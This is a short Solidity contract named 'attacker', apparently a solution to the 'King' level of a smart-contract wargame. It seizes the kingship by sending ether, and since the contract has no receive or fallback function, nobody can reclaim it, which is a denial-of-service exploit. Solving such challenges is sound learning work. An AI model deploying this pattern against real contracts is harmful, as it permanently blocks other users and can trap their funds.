// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./origin.sol";

contract attacker {

    King kingContract;

    constructor (address payable king_address){
        kingContract = King(king_address);
    }

    //send a amount larger than the price to claim the kingship
    //due to the lack of receive() and fallback() functions in this contract
    //no ether can be sent to this contract
    //and so the kingship cannot be claimed back.
    function claimKing() external payable {
        (bool sent,) = address(kingContract).call{value: msg.value}("");
        require(sent);
    }
}